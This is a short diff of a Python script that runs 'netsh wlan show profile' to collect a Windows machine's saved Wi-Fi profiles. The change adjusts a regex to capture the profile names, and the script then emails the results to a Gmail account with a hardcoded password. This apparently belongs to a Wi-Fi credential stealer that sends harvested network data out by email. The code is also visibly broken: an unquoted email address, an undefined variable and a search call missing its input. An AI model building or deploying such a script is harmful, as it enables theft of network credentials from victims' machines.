@@ -15,6 +15,7 @@ def send_mail(email, password, message):
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
 #\s* regex to accept any amount of blank space
-network_names = re.search("Profile\s*:\s")
+#.* to match ANY chars
+network_names = re.search("(Profile\s*:\s)(.*)")
 
 send_mail(name@gmail.com, "password123", result)
